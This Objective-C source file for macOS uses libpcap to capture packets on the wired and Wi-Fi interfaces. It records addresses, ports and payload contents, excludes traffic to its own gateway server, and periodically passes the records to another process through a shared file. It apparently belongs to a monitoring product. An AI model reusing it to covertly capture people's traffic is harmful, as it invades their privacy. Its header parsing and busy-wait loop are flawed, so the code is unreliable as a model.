//
//  NetworkTrafficCapture.m
//  NetworkTrafficCaptureManager
//
//  Created by ophat on 10/9/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//


#include <stdio.h>
#include <ifaddrs.h>
#include <arpa/inet.h>

#import <SystemConfiguration/SystemConfiguration.h>
#import <CoreWLAN/CoreWLAN.h>


#import "NetworkTrafficCapture.h"
#import "NetworkStructure.h"

#import "DateTimeFormat.h"

#define kDirectionTypeDownload      0
#define kDirectionTypeUpload        1
#define kInterval                   60

#define  kNetworkTypeUnknown        0
#define  kNetworkTypeCellular       1
#define  kNetworkTypeWired          2
#define  kNetworkTypeWifi           3
#define  kNetworkTypeBluetooth      4
#define  kNetworkTypeUSB            5

void wifi_Network_ChangedCallback(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx);
void lans_Network_ChangedCallback(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx);

void receivePacketByLan(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) ;
void receivePacketByWifi(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

@implementation NetworkTrafficCapture
@synthesize mIsReadyToShare,mIsRemoving;
@synthesize mUsedInterfaceHandle1,mUsedInterfaceHandle2;
@synthesize mHandle1, mHandle2;
@synthesize mMyUrl;
@synthesize mSharedFileSender;
@synthesize mSchedule;
@synthesize mInfos,mInfos_Temp;

NetworkTrafficCapture * _NetworkTrafficCapture;

#pragma mark ### start/stop NetworkCapture

-(void) startNetworkCapture {
    DLog(@"### startNetworkCapture");
    if (!_NetworkTrafficCapture) {
        _NetworkTrafficCapture = self;
    }
    if (!mSharedFileSender) {
        mSharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:@"SecurityInfo"];
    }
    if (!mInfos) {
        mInfos = [[NSMutableArray alloc]init];
    }
    if (!mInfos_Temp) {
        mInfos_Temp = [[NSMutableArray alloc]init];
    }
    self.mIsRemoving = false;
    self.mIsReadyToShare = false;
    
    self.mSchedule = [NSTimer scheduledTimerWithTimeInterval:kInterval target:self selector:@selector(triggerForSend) userInfo:nil repeats:YES];
    
    char *interface;
    char errbuf[PCAP_ERRBUF_SIZE];

    NSString * host = @"";
    if ([mMyUrl length] > 0) {
        host = [NSString stringWithFormat:@"host not %@",mMyUrl];
        host = [host stringByReplacingOccurrencesOfString:@"http://" withString:@""];
        host = [host stringByReplacingOccurrencesOfString:@"https://" withString:@""];
        host = [host stringByReplacingOccurrencesOfString:@"/gateway" withString:@""];
    }
   
    const char * filter_exp = [host UTF8String];
    
    bpf_u_int32 net;
    struct bpf_program filtter;
    
    pcap_if_t *alldevs;
    pcap_if_t *d;
    
    pcap_findalldevs(&alldevs, errbuf);
    
    if (alldevs == nil) {
        DLog(@"Couldn't find default device: %s\n", errbuf);
        return ;
    }
    
    for(d=alldevs; d; d=d->next){
        interface = d->name;
        NSString * checkInterface = [NSString stringWithFormat:@"%s",interface];
        if ([checkInterface isEqualToString:@"en0"]) {
        
            self.mHandle1 = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
            if (self.mHandle1 == NULL) {
                DLog(@"Couldn't open device %s: %s\n", interface, errbuf);
                return ;
            }
            if (pcap_compile(self.mHandle1, &filtter, filter_exp, 1, net) == -1) {
                DLog(@"Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(self.mHandle1));
                return ;
            }
            if (pcap_setfilter(self.mHandle1, &filtter) == -1) {
                DLog(@"Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(self.mHandle1));
                return ;
            }
            DLog(@"interface %s",interface);
            self.mUsedInterfaceHandle1 = [NSString stringWithFormat:@"%s",interface];
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                pcap_loop(self.mHandle1,-1,receivePacketByLan,nil);
            });
        }else if([checkInterface isEqualToString:@"en1"]){
            self.mHandle2 = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
            if (self.mHandle2 == NULL) {
                DLog(@"Couldn't open device %s: %s\n", interface, errbuf);
                return ;
            }
            if (pcap_compile(self.mHandle2, &filtter, filter_exp, 1, net) == -1) {
                DLog(@"Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(self.mHandle2));
                return ;
            }
            if (pcap_setfilter(self.mHandle2, &filtter) == -1) {
                DLog(@"Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(self.mHandle2));
                return ;
            }
            DLog(@"interface %s",interface);
            self.mUsedInterfaceHandle2 = [NSString stringWithFormat:@"%s",interface];
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                pcap_loop(self.mHandle2,-1,receivePacketByWifi,nil);
            });
    
        }
    }
}

-(void) stopNetworkCapture {
    DLog(@"stopNetworkCapture");
    if (self.mHandle1) {
        pcap_breakloop(self.mHandle1);
        pcap_close(self.mHandle1);
    }
    if (self.mHandle2) {
        pcap_breakloop(self.mHandle2);
        pcap_close(self.mHandle2);
    }
    if (mSchedule) {
        [self.mSchedule invalidate];
        self.mSchedule = nil;
    }
}

#pragma mark ### CapturePacket

void receivePacketByLan(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    _NetworkTrafficCapture.mIsReadyToShare = false;
    
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
 
    int trafficType = 0;
    
    const struct sniff_ip *ip;              /* The IP header */
    const struct sniff_tcp *tcp;            /* The TCP header */

    //const struct sniff_ethernet *ethernet;  /* The ethernet header */
    const char *payload;                    /* Packet payload */

    ip_header *ih;
    udp_header *uh;
    u_int ip_len;
    u_short sport,dport;
  
    u_int size_ip;
    u_int size_tcp;
    
    //ethernet = (struct sniff_ethernet*)(packet);
    
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if (size_ip < 20) {
        //DLog(@" * Invalid IP header length: %u bytes\n", size_ip);
        [pool drain];
        return;
    }
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    if (size_tcp < 20) {
        //DLog(@" * Invalid TCP header length: %u bytes\n", size_tcp);
        [pool drain];
        return;
    }
    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

    trafficType = ip->ip_p;
    
    NSString * packet_length = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",header->len]];

    ih = (ip_header *) (packet + 14); //length of ethernet header
    
    /* retireve the position of the udp header */
    ip_len = (ih->ver_ihl & 0xf) * 4;
    uh = (udp_header *) ((u_char*)ih + ip_len);
    
    // GET PORT
    sport = ntohs( uh->sport );
    dport = ntohs( uh->dport );
    
    NSString * sourceIP = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d.%d.%d.%d",ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3, ih->saddr.byte4]];
    NSString * sourcePort = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",sport]];
    
    NSString * destinationIP = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d.%d.%d.%d",ih->daddr.byte1, ih->daddr.byte2, ih->daddr.byte3, ih->daddr.byte4]];
    NSString * destinationPort = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",dport]];

    NSMutableDictionary * info = [[NSMutableDictionary alloc]init];
    [info setObject:[NSNumber numberWithInt:trafficType] forKey:@"trafficType"];
    [info setObject:[NSNumber numberWithInt:kNetworkTypeWired] forKey:@"NetworkType"];
    [info setObject:_NetworkTrafficCapture.mUsedInterfaceHandle1 forKey:@"mUsedInterfaceHandle"];
    [info setObject:destinationIP forKey:@"destinationIP"];
    [info setObject:destinationPort forKey:@"destinationPort"];
    [info setObject:sourceIP forKey:@"sourceIP"];
    [info setObject:sourcePort forKey:@"sourcePort"];
    [info setObject:packet_length forKey:@"packet_length"];
    [info setObject:[NSString stringWithFormat:@"%s",payload] forKey:@"payload"];
    
    if (_NetworkTrafficCapture.mIsRemoving) {
        [[_NetworkTrafficCapture mInfos_Temp] addObject:info];
    }else{
        if ([[_NetworkTrafficCapture mInfos_Temp] count]>0) {
            [[_NetworkTrafficCapture mInfos] addObjectsFromArray:[_NetworkTrafficCapture mInfos_Temp]];
            [[_NetworkTrafficCapture mInfos_Temp] removeAllObjects];
        }
        [[_NetworkTrafficCapture mInfos] addObject:info];
    }
    
    [info release];

    [packet_length release];
    [sourceIP release];
    [sourcePort release];
    [destinationIP release];
    [destinationPort release];

    [pool drain];
    
    _NetworkTrafficCapture.mIsReadyToShare = true;

}

void receivePacketByWifi(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    _NetworkTrafficCapture.mIsReadyToShare = false;
    
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    int trafficType = 0;
    
    const struct sniff_ip *ip;              /* The IP header */
    const struct sniff_tcp *tcp;            /* The TCP header */

    //const struct sniff_ethernet *ethernet;  /* The ethernet header */
    const char *payload;                    /* Packet payload */
    
    ip_header *ih;
    udp_header *uh;
    u_int ip_len;
    u_short sport,dport;
    
    u_int size_ip;
    u_int size_tcp;
    
    //ethernet = (struct sniff_ethernet*)(packet);
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if (size_ip < 20) {
        //DLog(@" * Invalid IP header length: %u bytes\n", size_ip);
        [pool drain];
        return;
    }
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    if (size_tcp < 20) {
        //DLog(@" * Invalid TCP header length: %u bytes\n", size_tcp);
        [pool drain];
        return;
    }
    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    
    trafficType = ip->ip_p;

    NSString * packet_length = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",header->len]];

    ih = (ip_header *) (packet + 14); // length of ethernet header

    /* retireve the position of the udp header */
    ip_len = (ih->ver_ihl & 0xf) * 4;
    uh = (udp_header *) ((u_char*)ih + ip_len);
    
    // GET PORT
    sport = ntohs( uh->sport );
    dport = ntohs( uh->dport );
    
    NSString * sourceIP = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d.%d.%d.%d",ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3, ih->saddr.byte4]];
    NSString * sourcePort = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",sport]];
    
    NSString * destinationIP = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d.%d.%d.%d",ih->daddr.byte1, ih->daddr.byte2, ih->daddr.byte3, ih->daddr.byte4]];
    NSString * destinationPort = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%d",dport]];
    
    NSMutableDictionary * info = [[NSMutableDictionary alloc]init];
    [info setObject:[NSNumber numberWithInt:trafficType] forKey:@"trafficType"];
    [info setObject:[NSNumber numberWithInt:kNetworkTypeWifi] forKey:@"kNetworkType"];
    [info setObject:_NetworkTrafficCapture.mUsedInterfaceHandle2 forKey:@"mUsedInterfaceHandle"];
    [info setObject:destinationIP forKey:@"destinationIP"];
    [info setObject:destinationPort forKey:@"destinationPort"];
    [info setObject:sourceIP forKey:@"sourceIP"];
    [info setObject:sourcePort forKey:@"sourcePort"];
    [info setObject:packet_length forKey:@"packet_length"];
    [info setObject:[NSString stringWithFormat:@"%s",payload] forKey:@"payload"];
    
    if (_NetworkTrafficCapture.mIsRemoving) {
        [[_NetworkTrafficCapture mInfos_Temp] addObject:info];
    }else{
        if ([[_NetworkTrafficCapture mInfos_Temp] count]>0) {
            [[_NetworkTrafficCapture mInfos] addObjectsFromArray:[_NetworkTrafficCapture mInfos_Temp]];
            [[_NetworkTrafficCapture mInfos_Temp] removeAllObjects];
        }
        [[_NetworkTrafficCapture mInfos] addObject:info];
    }
    
    [info release];
    
    [packet_length release];
    [sourceIP release];
    [sourcePort release];
    [destinationIP release];
    [destinationPort release];
    
    [pool drain];
    
    _NetworkTrafficCapture.mIsReadyToShare = true;
}

# pragma mark ## sendbackData
-(void)triggerForSend{
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        [_NetworkTrafficCapture sendbackDataToAppWith:mInfos];
    });
}

-(void)sendbackDataToAppWith:(NSMutableArray *)aInfo {
    while (!mIsReadyToShare) {
        sleep(0.000000001);
    }
    mIsRemoving = true;
    DLog(@"sendbackDataToAppWith %d",(int)[aInfo count]);
    
    NSMutableData* data			= [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:aInfo forKey:@"command"];
    [archiver finishEncoding];
    [mSharedFileSender writeDataToSharedFile:data];
    [data release];
    [archiver release];

    [aInfo removeAllObjects];
    mIsRemoving = false;

}

#pragma mark ### Destroy

-(void)dealloc{
    [self stopNetworkCapture];
    [mInfos release];
    [mInfos_Temp release];
    [mSharedFileSender release];
    [mUsedInterfaceHandle1 release];
    [mUsedInterfaceHandle2 release];
    [super dealloc];
}
@end
